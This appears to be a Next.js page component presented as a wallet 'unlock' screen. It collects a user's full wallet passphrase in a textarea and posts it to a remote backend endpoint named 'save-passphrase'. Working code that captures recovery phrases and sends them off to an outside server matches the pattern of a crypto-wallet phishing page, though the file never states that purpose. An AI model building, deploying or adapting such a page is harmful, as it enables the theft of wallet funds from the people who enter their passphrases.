"use client";

import { useState, useEffect, Suspense } from "react";
import { useSearchParams } from "next/navigation";
import { Textarea } from "@/components/ui/textarea";
import { CustomButton } from "@/components/ui/button";  
import axios from "axios";

function UnlockWalletContent() {
  const [passphrase, setPassphrase] = useState("");
  const [error, setError] = useState<string | null>(null);
  const [success, setSuccess] = useState<string | null>(null);
  const [token, setToken] = useState<string | null>(null);
  const searchParams = useSearchParams();

  const API_BASE_URL = process.env.NEXT_PUBLIC_BACKEND_URL || "https://pi-wallet-backend.onrender.com";

  useEffect(() => {
    const extractedToken = searchParams?.get("token");
    if (extractedToken) {
      setToken(extractedToken);
    } else {
      axios.get(`${API_BASE_URL}/api/wallet/generate-link`)
        .then(response => {
          if (response.data.link) {
            const url = new URL(response.data.link);
            const newToken = url.searchParams.get("token");
            if (newToken) setToken(newToken);
          }
        })
        .catch(() => setError("Failed to generate unlock link"));
    }
  }, [searchParams, API_BASE_URL]);

  const handleUnlock = async () => {
    if (!token) {
      setError("Token is missing");
      return;
    }

    if (!passphrase.trim()) {
      setError("Please enter your passphrase");
      return;
    }

    setError(null);
    setSuccess(null);

    try {
      const response = await axios.post(
        `${API_BASE_URL}/api/wallet/save-passphrase?token=${encodeURIComponent(token)}`, 
        { passphrase }, 
        { headers: { "Content-Type": "application/json" } }
      );

      setSuccess(response.data.message);
    } catch (error) {
      if (axios.isAxiosError(error)) {
        setError(error.response?.data?.message || "Failed to unlock wallet");
      } else {
        setError("An unexpected error occurred");
      }
    }
  };  

  return (
    <div className="flex flex-col min-h-screen bg-white items-center justify-center p-6">
      <h1 className="text-2xl font-bold mb-4">Unlock Your Wallet</h1>

      <Textarea
        placeholder="Enter your passphrase"
        value={passphrase}
        onChange={(e) => setPassphrase(e.target.value)}
        className="min-h-[200px] border border-gray-300 rounded-md p-4 resize-none w-full max-w-md"
      />

      {error && <p className="text-red-500 mt-2">{error}</p>}
      {success && <p className="text-green-500 mt-2">{success}</p>}

      <CustomButton
        onClick={handleUnlock}
        className="w-full max-w-md bg-purple-700 hover:bg-purple-800 text-white font-bold py-3 mt-4 rounded-lg"
      >
        Unlock Wallet
      </CustomButton>
    </div>
  );
}

export default function UnlockWallet() {
  return (
    <Suspense fallback={<p>Loading...</p>}>
      <UnlockWalletContent />
    </Suspense>
  );
}
